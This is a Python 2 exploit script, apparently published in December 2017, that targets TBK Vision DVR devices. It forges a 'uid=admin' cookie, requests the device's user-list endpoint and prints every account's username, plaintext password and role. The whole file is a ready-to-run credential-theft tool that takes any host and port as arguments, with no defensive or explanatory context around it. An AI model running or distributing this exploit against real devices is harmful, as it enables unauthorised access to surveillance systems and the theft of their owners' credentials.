# -*- coding: utf-8 -*- 
import json
import requests
import argparse

class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'

details = ''' 
 # Exploit Title:   DVR "TBK VISION"; Credentials Exposed
 # Date:            22/12/2017
 # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
 # Vendor:          TBK Vision

'''
parser = argparse.ArgumentParser(prog='**********.py',
                                description=' [+] Obtaining all credentials ***********', 
                                epilog='[+] Demo: python **********.py --host 192.168.1.101 -p 81',
                                version="++++++")

parser.add_argument('--host',   dest="HOST",    help='Host',    required=True)
parser.add_argument('--port',   dest="PORT",    help='Port',    default=80)

args    =   parser.parse_args()

HST     =   args.HOST
port    =   args.PORT

headers = {}

fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list" #-H "Cookie: uid=admin"
host        =   "http://"+HST+":"+str(port)+"/"

def makeReqHeaders(xCookie):
    headers["Host"]             =  host
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"]       = "close"
    headers["Content-Type"]     = "text/html"
    headers["Cookie"]           = "uid="+xCookie
    return headers


try:
    rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)
except Exception,e:
    #print e
    print Colors.RED+" [+] Timed out\n"+Colors.DEFAULT
    exit()

dataJson = json.loads(rX.text)
totUsr = len(dataJson)   #--> 10

print "\n [+] Total Usuarios: "+str(totUsr)+" (?)"
print " ======================="


try:
    for obj in range(0,totUsr):
        _usuario    = dataJson["list"][obj]["uid"]
        _password   = dataJson["list"][obj]["pwd"]
        _role       = dataJson["list"][obj]["role"]
        print " [+] "+_usuario + " : " + str(_password) +" (Rol: "+str(_role) +" )"
except Exception, e:
    print "\n [!]: "+str(e)
    #print " [+] "+ str(dataJson)

 
print "\n"